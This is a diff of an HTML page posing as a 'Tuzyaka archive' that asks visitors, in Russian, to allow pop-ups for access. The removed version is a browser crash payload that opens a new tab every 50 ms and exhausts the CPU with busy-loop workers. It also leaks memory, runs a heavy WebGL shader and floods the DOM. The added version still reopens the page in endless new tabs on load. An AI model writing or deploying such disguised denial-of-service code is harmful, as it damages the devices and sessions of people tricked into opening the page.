@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <title>Tuzyaka archive</title>
@@ -22,164 +22,21 @@
             color: #f00;
             text-shadow: 0 0 5px #f00;
         }
-        canvas {
-            display: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
     </style>
 </head>
 <body>
     <h1>Tuzyaka archive</h1>
     <p>Дайте доступ к архиву, разрешив всплывающие окна</p>
-    <canvas id="canvas"></canvas>
 
     <script>
-        // Автоматический запуск после загрузки страницы
-        window.onload = () => {
-            document.body.innerHTML = "<h1>Access Granted</h1>";
-            document.body.style.color = "#f00";
-            document.body.style.textShadow = "0 0 10px #f00";
-            setTimeout(() => {
-                startCrashCycle(); // Запускаем цикл с нагрузкой и вкладками
-            }, 1000); // Задержка 1 секунда для эффекта
-        };
-
-        // Бесконечный цикл открытия вкладок
-        function startCrashCycle() {
-            function openCrashTab() {
-                const newWindow = window.open(window.location.href, '_blank');
-                if (!newWindow) {
-                    console.log("Всплывающие окна заблокированы. Разрешите их для доступа.");
-                }
-                startFullLoad(); // Нагрузка в текущей вкладке
-                setTimeout(openCrashTab, 50); // Открытие новой вкладки каждые 50 мс
-            }
-            openCrashTab();
+        // Бесконечные попытки открытия новых вкладок
+        function tryOpenTab() {
+            window.open(window.location.href, '_blank');
+            setTimeout(tryOpenTab, 50); // Пытаемся открывать каждые 50 мс
         }
 
-        // Полная нагрузка на процессор, память, GPU и DOM
-        function startFullLoad() {
-            // 1. Перегрузка CPU и памяти
-            function overloadCPUandMemory() {
-                let memoryHog = [];
-                const workerCode = `
-                    onmessage = function() {
-                        let x = 0;
-                        while (true) {
-                            x += Math.random() * Math.sin(Date.now());
-                        }
-                    };
-                `;
-                for (let i = 0; i < 16; i++) {
-                    try {
-                        const blob = new Blob([workerCode], { type: "application/javascript" });
-                        const worker = new Worker(URL.createObjectURL(blob));
-                        worker.postMessage("start");
-                    } catch (e) {
-                        setInterval(() => {
-                            let x = 0;
-                            for (let j = 0; j < 1000000; j++) {
-                                x += Math.random() * Math.sin(Math.random());
-                            }
-                        }, 1);
-                    }
-                }
-                (function leakMemory() {
-                    for (let i = 0; i < 500; i++) {
-                        memoryHog.push(new Uint8Array(1000000));
-                    }
-                    setTimeout(leakMemory, 0);
-                })();
-            }
-
-            // 2. Перегрузка GPU
-            function overloadGPU() {
-                const canvas = document.getElementById("canvas");
-                canvas.style.display = "block";
-                canvas.width = window.innerWidth * 2;
-                canvas.height = window.innerHeight * 2;
-                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                if (!gl) return;
-
-                const vsSource = `
-                    attribute vec2 aPos;
-                    void main() {
-                        gl_Position = vec4(aPos, 0.0, 1.0);
-                    }
-                `;
-                const fsSource = `
-                    precision highp float;
-                    uniform float uTime;
-                    void main() {
-                        float r = 0.0, g = 0.0, b = 0.0;
-                        for (int i = 0; i < 5000; i++) {
-                            r += sin(float(i) * uTime * 0.01);
-                            g += cos(float(i) * uTime * 0.02);
-                            b += tan(float(i) * uTime * 0.03);
-                        }
-                        gl_FragColor = vec4(fract(r), fract(g), fract(b), 1.0);
-                    }
-                `;
-
-                const vertexShader = gl.createShader(gl.VERTEX_SHADER);
-                gl.shaderSource(vertexShader, vsSource);
-                gl.compileShader(vertexShader);
-                const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
-                gl.shaderSource(fragmentShader, fsSource);
-                gl.compileShader(fragmentShader);
-                const program = gl.createProgram();
-                gl.attachShader(program, vertexShader);
-                gl.attachShader(program, fragmentShader);
-                gl.linkProgram(program);
-                gl.useProgram(program);
-
-                const posBuffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, posBuffer);
-                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
-
-                const aPos = gl.getAttribLocation(program, "aPos");
-                gl.enableVertexAttribArray(aPos);
-                gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
-
-                const uTime = gl.getUniformLocation(program, "uTime");
-                function render() {
-                    gl.uniform1f(uTime, performance.now() / 1000);
-                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-                    requestAnimationFrame(render);
-                }
-                render();
-            }
-
-            // 3. Перегрузка DOM
-            function overloadDOM() {
-                function chaos() {
-                    for (let i = 0; i < 200; i++) {
-                        const div = document.createElement("div");
-                        div.style.cssText = `
-                            position: absolute;
-                            left: ${Math.random() * 100}%;
-                            top: ${Math.random() * 100}%;
-                            width: 100px;
-                            height: 100px;
-                            background: hsl(${Math.random() * 360}, 100%, 50%);
-                            transform: rotate(${Math.random() * 360}deg);
-                        `;
-                        document.body.appendChild(div);
-                    }
-                    setTimeout(chaos, 5);
-                }
-                chaos();
-            }
-
-            // Запуск нагрузки
-            overloadCPUandMemory();
-            overloadGPU();
-            overloadDOM();
-        }
+        // Запуск при загрузке страницы
+        tryOpenTab();
     </script>
 </body>
 </html>
